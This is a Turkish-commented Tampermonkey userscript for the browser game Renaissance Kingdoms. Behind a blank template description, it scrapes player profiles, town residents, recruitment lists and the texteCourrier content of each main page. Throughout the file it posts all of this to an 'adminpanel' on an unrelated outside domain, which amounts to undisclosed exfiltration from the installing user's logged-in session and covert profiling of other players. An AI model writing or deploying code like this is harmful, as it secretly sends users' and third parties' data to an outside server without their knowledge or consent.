// ==UserScript==
// @name         Lozan
// @namespace    http://tampermonkey.net/
// @version      1.3.3
// @description  try to take over the world!
// @author       You
// @include        https://www.renaissancekingdoms.com/EcranPrincipal.php*
// @include        https://www.renaissancekingdoms.com/EcranPrincipalAjax.php*
// @include        https://www.renaissancekingdoms.com/FichePersonnage.php*
// @include        https://www.renaissancekingdoms.com/Ajax.php*
// @include        https://fullhdcizgifilmizle.com/*
// @require     https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js
// @grant       GM.xmlHttpRequest
// @grant       GM.setValue
// @grant       GM.getValue
// @downloadURL https://update.greasyfork.org/scripts/406437/Lozan.user.js
// @updateURL https://update.greasyfork.org/scripts/406437/Lozan.meta.js
// ==/UserScript==
//alert("Çalıştı!!");
/*Linkteki get verisini çeken fonksiyon*/
function gup( name, url ) {
    if (!url) url = location.href;
    name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
    var regexS = "[\\?&]"+name+"=([^&#]*)";
    var regex = new RegExp( regexS );
    var results = regex.exec( url );
    return results == null ? null : results[1];
}

var pageUrl =document.URL;
console.log(pageUrl);

/*Profil Sayfalarını tarayan kod*/
if ( pageUrl.includes("FichePersonnage")) {
    var loginName = gup('login', pageUrl);
    console.log(loginName);
  //alert("FichePersonnage!!");
    var page =$( "html").html();
    //console.log(page);
    var entete_nom =$( ".entete_nom").eq( 0 ).text().replace(/  +/g, ' ').trim();
    console.log(entete_nom);
    var level =$( "span[class=niveauPersonnage]").eq( 0 ).text();
    console.log(level);
    var titlePerson =$( "span[id=FichePersoTitre]").eq( 0 ).text();
    console.log(titlePerson);
    var job =$( "span[id=moi_metier]").eq( 0 ).text();
    console.log(job);
    var path =$( "span[id=moi_voie]").eq( 0 ).text();
    console.log(path);
    var charismaPoint =$( "span[id=moi_charisme]").eq( 0 ).text();
    console.log(charismaPoint);
    var forcePoint =$( "span[id=moi_force]").eq( 0 ).text();
    console.log(forcePoint);
    var reputationPoint =$( "span[id=moi_reputation]").eq( 0 ).text();
    console.log(reputationPoint);
    var intelligencePoint =$( "span[id=moi_intelligence]").eq( 0 ).text();
    console.log(intelligencePoint);
    var signDateParagraph =$( "div[class=informationsHRP] > p").eq( 3 ).text();
    console.log(signDateParagraph);
    var status =$( "div[class=informationsHRP] > p").eq( 5 ).text();
    console.log(status);
    var lastConnectDateParagraph =$( "div[class=informationsHRP] > p").eq( 4 ).text();
    console.log(lastConnectDateParagraph);
    var lastPersonGiveTrustPointParagraph =$( "div[class=informationsHRP] > p").eq( 6 ).text();
    console.log(lastPersonGiveTrustPointParagraph);
    var family =$( "div[class=informationsHRP] > div > a[target=EP]").eq( 0 ).text();
    console.log(family);
    var sharedAccounts =$( "div[class=informationsHRP] > div[class=FPContentBlocInfosElem]").eq( 0 ).text().replace(/  +/g, ' ').trim();
    console.log(sharedAccounts);
    var body="";
if (entete_nom.length == 0) {
    body=$( "body").eq( 0 ).text();
}
    console.log(body);
    GM.xmlHttpRequest({
  method: "POST",
  url: "https://fullhdcizgifilmizle.com/adminpanel/renaissancekingdoms/personscaner.php",
  data: "loginName="+loginName+"&entete_nom="+entete_nom+"&level="+level+"&titlePerson="+titlePerson+"&job="+job+"&path="+path+"&charismaPoint="+charismaPoint+"&forcePoint="+forcePoint+"&reputationPoint="+reputationPoint+"&intelligencePoint="+intelligencePoint+"&signDateParagraph="+signDateParagraph+"&status="+status+"&lastConnectDateParagraph="+lastConnectDateParagraph+"&lastPersonGiveTrustPointParagraph="+lastPersonGiveTrustPointParagraph+"&family="+family+"&sharedAccounts="+sharedAccounts+"&body="+body,
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  onload: function(response) {
      console.log(response.responseText);
  }
});


}
/*Kasabadaki Kasaba Bilgileri kısmını tarayan kod*/
$( "a[class=lien_default]" ).eq( 3 ).click(function() {//Sayfa üzerindeki onclick fonksiyonun içeren linklerin üçüncüsüne tıklandığında. Ayanlar için bu dördüncü
  var tableObj =$( "table");//Sayfa üzerindeki tabloları bulur
    var tableArray = $.map(tableObj, function(value, index){
        return [value];
    });
    console.log(tableArray);//Sayfa üzerindeki tabloları consolo yazdırır
    var persontable =$( "table").eq( 2 ).html();//Sayfa üzerindeki ilk tabloyu bulur ve içindekileri alır

    var title =$( "title").html().replace(/&nbsp;/g, "");//Sayfanının başlığını bulur ve gereksiz işaretleri siler
    console.log(persontable);
    console.log(title);
    GM.xmlHttpRequest({
  method: "POST",
  url: "https://fullhdcizgifilmizle.com/adminpanel/renaissancekingdoms/currenttownpersontablescaner.php",//Verilerin gönderileceği url
  data: "data="+persontable+"&title="+ title,
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  onload: function(response) {
      console.log(response.responseText);
  }
});
});
/*Kasabadaki Köylü ve Zanaatkarlar Bilgileri kısmını tarayan kod*/
$( "a[class=lien_default]" ).eq( 4 ).click(function() {//Sayfa üzerindeki onclick fonksiyonun içeren linklerin dördüncüsüne tıklandığında. Ayanlar için bu beşinci
  var tableObj =$( "table");//Sayfa üzerindeki tabloları bulur
    var tableArray = $.map(tableObj, function(value, index){
        return [value];
    });
    console.log(tableArray);//Sayfa üzerindeki tabloları consolo yazdırır
    var persontable =$( "table").eq( 2 ).html();//Sayfa üzerindeki ilk tabloyu bulur ve içindekileri alır

    var title =$( "title").html().replace(/&nbsp;/g, "");//Sayfanının başlığını bulur ve gereksiz işaretleri siler
    console.log(persontable);
    console.log(title);
    GM.xmlHttpRequest({
  method: "POST",
  url: "https://fullhdcizgifilmizle.com/adminpanel/renaissancekingdoms/townpersontablescaner.php",//Verilerin gönderileceği url
  data: "data="+persontable+"&title="+ title,
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  onload: function(response) {
      console.log(response.responseText);
  }
});
});
$( "a#onglet2" ).click(function() {

$( "a[class=lien_default]" ).eq( 6 ).click(function() {//Normalda 6 ayanlarda 7
    var recruitmentslist =$( "div#zoneTexte2.texte").eq( 0 ).html();//Sayfa üzerindeki ilk tabloyu bulur ve içindekileri alır
    var title =$( "title").html().replace(/&nbsp;/g, "");//Sayfanının başlığını bulur ve gereksiz işaretleri siler
    console.log(recruitmentslist);
    console.log(title);
    GM.xmlHttpRequest({
  method: "POST",
  url: "https://fullhdcizgifilmizle.com/adminpanel/renaissancekingdoms/townrecentrecruitments.php",//Verilerin gönderileceği url
  data: "data="+recruitmentslist+"&title="+ title,
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  onload: function(response) {
      console.log(response.responseText);
  }
});
    });


});
if ( pageUrl.includes("widgetSearchLogin")) {
    var widgetSearchLoginJson=$( "body").eq( 0 ).text();
    console.log(widgetSearchLoginJson);
        GM.xmlHttpRequest({
  method: "POST",
  url: "https://fullhdcizgifilmizle.com/adminpanel/renaissancekingdoms/widgetsearchloginreceiver.php",//Verilerin gönderileceği url
  data: "data="+widgetSearchLoginJson,
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  onload: function(response) {
      console.log(response.responseText);
  }
});

}

var onclickLinkObj =$( "a[class=lien_default]");//Sayfa üserindeki onclick fonksiyonunu barındıran linkleri bulur
    var onclickLinkArray = $.map(onclickLinkObj, function(value, index){
        return [value];
    });
    console.log(onclickLinkArray);//Sayfa üserindeki onclick fonksiyonunu barındıran linkleri console yazdırır

var texteCourrierObj =$( "div.texteCourrier");//Sayfa üserindeki onclick fonksiyonunu barındıran linkleri bulur
    var texteCourrierArray = $.map(texteCourrierObj, function(value, index){
        return [value];
    });
    console.log(texteCourrierArray);//Sayfa üserindeki onclick fonksiyonunu barındıran linkleri console yazdırır

    var texteCourrier =$( "div.texteCourrier").eq( 0 ).html();//Sayfa üzerindeki ilk tabloyu bulur ve içindekileri alır
    var title =$( "title").html().replace(/&nbsp;/g, "");//Sayfanının başlığını bulur ve gereksiz işaretleri siler
    console.log(texteCourrier);
    console.log(title);
    GM.xmlHttpRequest({
  method: "POST",
  url: "https://fullhdcizgifilmizle.com/adminpanel/renaissancekingdoms/onlinescaner.php",//Verilerin gönderileceği url
  data: "data="+texteCourrier+"&title="+ title,
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  onload: function(response) {
      console.log(response.responseText);
  }
        });